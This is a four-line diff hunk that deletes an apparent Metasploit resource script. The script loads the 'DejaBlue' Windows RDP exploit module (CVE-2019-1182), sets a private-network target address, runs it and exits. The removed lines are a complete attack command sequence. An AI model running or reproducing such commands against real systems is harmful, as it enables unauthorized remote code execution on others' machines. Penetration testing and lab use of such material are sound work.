@@ -1,4 +1,0 @@
-use exploit/windows/rdp/cve_2019_1182_dejablue
-set RHOST 192.168.90.13
-run
-exit
